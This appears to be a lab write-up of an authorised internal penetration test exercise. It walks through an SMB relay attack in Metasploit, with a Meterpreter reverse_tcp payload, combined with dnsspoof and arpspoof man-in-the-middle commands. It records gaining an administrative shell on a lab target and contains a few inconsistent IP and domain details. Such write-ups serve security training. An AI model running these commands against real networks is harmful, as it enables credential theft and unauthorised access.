# Internal Penetration Test – Slytherin Solutions

## Scenario

You have been hired by Slytherin Solutions, a mid-sized technology company, to conduct a security assessment. The company wants to evaluate potential risks within its internal network and has authorized a controlled penetration test within the defined scope.

**Scope & Rules of Engagement**

- The penetration test is internal, meaning you are connected directly to their LAN.

- The network range for testing is 192.168.50.0/24.

- No credential brute-forcing to avoid locking out user accounts.

- Focus on network-based attacks, specifically SMB Relay and DNS spoofing.


**Objectives**

- Exploit misconfigurations using SMB Relay Attack.

- Manipulate network traffic using dnsspoof to redirect victims.


**Skills & Techniques Covered**

* Performing SMB Relay attacks against patched systems.
* Using dnsspoof to manipulate network traffic and redirect requests.
* Leveraging Metasploit for exploitation and session management.

**Tools Required**

- dnsspoof (for ARP and DNS spoofing)

- Metasploit Framework (for SMB relay exploitation)

## SMB Relay Attack Execution
In this scenario, I launched an SMB Relay Attack to intercept and relay authentication requests from a client machine to a target system, ultimately gaining a Meterpreter shell.

**Attack Flow**

* A client machine (192.168.50.12, running Windows 7) automatically attempts an SMB connection to \\fileserver.slytherin.com\wallet$ every 30 seconds.

* The attacker machine (192.168.50.23) spoofs the IP address of fileserver.slytherin.com to redirect SMB traffic.
* The client unknowingly connects to the attacker's machine instead of the real fileserver.slytherin.local.
*  The SMB Relay exploit (running on the attacker machine) captures and relays the authentication request to a vulnerable target (192.168.50.4).
*  The exploit successfully authenticates on the target and delivers a Windows Meterpreter shell, granting access to the system.

**Attack Execution**

Step 1: Start msfconsole and configure the SMB Relay exploit

````bash
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 192.168.50.23
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.50.23
set SMBHOST 192.168.50.4
exploit
````

Step 2: In a new tab, configure dnsspoof in order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain: slytherin.com. Create a file with fake dns entry with all subdomains of
slytherin.com pointing to our attacker machine.

````bash
echo "192.168.50.23 *.slytherin.com" > hosts
````

- run dns spoof in the same tab

````bash
dnsspoof -i eth1 -f hosts
````

image

Step 3: Activate the MiTM attack using the ARP Spoofing technique. My goal is to poison the traffic between my victim, Windows 7 at 192.168.50.12, and the default gateway at 192.168.50.1. In this way, I can manipulate the traffic using dnsspoof, which is already running. 
In order to perform an ARP Spoofing attack, I enabled the IP forwarding as follow in a new tab (3):

````bash
echo 1 > /proc/sys/net/ipv4/ip_forward
````

In two separate terminals, start the ARP Spoof attack against 192.168.50.12 and 192.168.50.1 using these commands:

````bash
arpspoof -i eth1 -t 192.168.50.12 192.168.50.1
arpspoof -i eth1 -t 192.168.50.1 192.168.50.12
````
image

image

So, every time the victim starts an SMB connection, dnsspoof aligned with the ARP Spoof attack, forges the DNS replies telling that the searched DNS address is hosted at the attacker machine:

image

* Then instead of getting a DNS response with the real IP address of fileserver.slytherin.com, it received the IP of the attacker: 192.168.50.23. In Metasploit, every time there is an incoming SMB connection, the SMB Relay exploit
grabs the SMB hashes (credentials) and then uses them to get a shell on the target machine (192.168.5.4) - since it was set in the SMBHOST field of the smb-relay exploit.

image

## Key Takeaway
In this lab, I were able to trick the client by spoofing DNS records, this, in turn, combined with SMB relay attack, provided us with a meterpreter session on the target machine with administrative privileges.
